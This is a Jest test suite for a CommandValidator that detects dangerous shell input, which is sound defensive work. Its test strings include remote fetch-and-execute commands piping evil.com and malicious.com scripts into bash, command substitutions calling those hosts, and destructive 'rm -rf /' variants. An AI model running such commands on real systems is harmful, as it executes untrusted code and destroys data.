import { describe, expect, it } from '@jest/globals'

import { ModuleConfig } from '../../../types'
import { CommandValidator } from '../validator'

describe('CommandValidator', () => {
  const defaultConfig: ModuleConfig = {
    enabled: true,
  }

  describe('constructor', () => {
    it('should create an instance with valid config', () => {
      const validator = new CommandValidator(defaultConfig)
      expect(validator).toBeInstanceOf(CommandValidator)
    })

    it('should throw error if config is invalid', () => {
      expect(() => new CommandValidator(null as any)).toThrow()
    })
  })

  describe('validate', () => {
    it('should detect rm -rf commands', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'rm -rf /var/log/*'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
      expect(findings[0].pattern.category).toBe('command_injection')
      expect(findings[0].matchedText).toBeTruthy()
      expect(findings[0].severity).toBeTruthy()
    })

    it('should detect pipe to bash', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'cat install.sh | bash'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
    })

    it('should detect curl pipe to shell', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'curl http://evil.com/script.sh | bash'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
      // Both pipe_to_shell and remote_execution are valid detections
      expect(['remote_execution', 'pipe_to_shell']).toContain(findings[0].pattern.subcategory)
    })

    it('should detect command chaining with dangerous commands', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'ls /tmp; rm -rf /var/log'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
    })

    it('should detect wget pipe to shell', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'wget http://malicious.com/script.sh -O - | bash'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
      // Both pipe_to_shell and remote_execution are valid detections
      expect(['remote_execution', 'pipe_to_shell']).toContain(findings[0].pattern.subcategory)
    })

    it('should detect backtick command substitution', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'echo `curl http://evil.com`'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
      expect(findings[0].pattern.subcategory).toBe('command_substitution')
    })

    it('should detect dollar substitution', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'echo $(wget http://malicious.com)'

      const findings = await validator.validate(command)

      expect(findings.length).toBeGreaterThan(0)
      expect(findings[0].module).toBe('command_validator')
      expect(findings[0].pattern.subcategory).toBe('command_substitution')
    })

    it('should return empty array for safe commands', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'ls -la /home/user'

      const findings = await validator.validate(command)

      expect(findings).toEqual([])
    })

    it('should handle safe complex commands', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'git status && npm test'

      const findings = await validator.validate(command)

      expect(findings).toEqual([])
    })

    it('should respect enabled flag in patterns', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'rm -rf /tmp/test'

      const findings = await validator.validate(command)

      // Should find at least one match since pattern is enabled
      expect(findings.length).toBeGreaterThan(0)
    })

    it('should handle empty string', async () => {
      const validator = new CommandValidator(defaultConfig)
      const findings = await validator.validate('')

      expect(findings).toEqual([])
    })

    it('should include metadata in findings', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'rm -rf /'

      const findings = await validator.validate(command)

      expect(findings[0]).toHaveProperty('metadata')
      expect(findings[0].metadata).toBeDefined()
    })

    it('should throw error for null input', async () => {
      const validator = new CommandValidator(defaultConfig)

      await expect(validator.validate(null as any)).rejects.toThrow()
    })

    it('should throw error for non-string input', async () => {
      const validator = new CommandValidator(defaultConfig)

      await expect(validator.validate(123 as any)).rejects.toThrow()
    })

    it('should detect multiple vulnerabilities in one command', async () => {
      const validator = new CommandValidator(defaultConfig)
      const command = 'curl http://evil.com | bash && rm -rf /var'

      const findings = await validator.validate(command)

      // Should detect multiple issues
      expect(findings.length).toBeGreaterThan(1)
    })
  })
})
